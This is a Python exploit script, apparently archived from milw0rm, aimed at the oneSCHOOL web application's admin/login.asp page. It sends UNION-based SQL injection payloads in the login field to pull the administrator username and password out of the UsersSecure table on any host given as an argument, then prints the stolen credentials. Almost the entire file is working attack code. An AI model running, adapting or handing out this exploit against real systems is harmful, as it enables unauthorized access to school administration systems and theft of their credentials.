#!/usr/bin/python

#oneSCHOOL admin/login.asp SQL Injection explot (for all versions)
#by Guga360.

import urllib
from sys import argv

query = {'txtOperation':'Login','txtLoginID':"""
' union select min(LoginName),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName>'a'--""",'txtPassword':'x','btnSubmit':'L+O+G+I+N+%3E%3E'}

queryx = urllib.urlencode(query)

if len(argv)<>2:
    print """
    **********
    
    Usage:
    oneSCHOOLxpl.py [host]

    [+] Exploiting...
    
    [+] User: admin
    [+] Password: 123
    
    *******************
    """
else:
    try:
        print '\n[+] Exploting...\n'
        host = argv[1]        
        if host[0:7]<>'http://':
            host = 'http://'+host
        url = urllib.urlopen(host+'/admin/login.asp', queryx)
        url = url.read()
        url = url.split()
        name = url.index('varchar')+2
        name = url[name]
        name = name.replace("'","")
        print '[+] User: ' + name
        query2 = query.copy()
        query2['txtLoginID']="""' union select min(Password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName='"""+name+"""'--"""
        query2 = urllib.urlencode(query2)
        url = urllib.urlopen(host+'/admin/login.asp', query2)
        url = url.read()
        url = url.split()
        passw = url.index('varchar')+2
        passw = url[passw]
        passw = passw.replace("'","")
        print '[+] Pass: '+passw
    except:
        print '[+] Not vulnerable!'

# milw0rm.com [2007-12-31]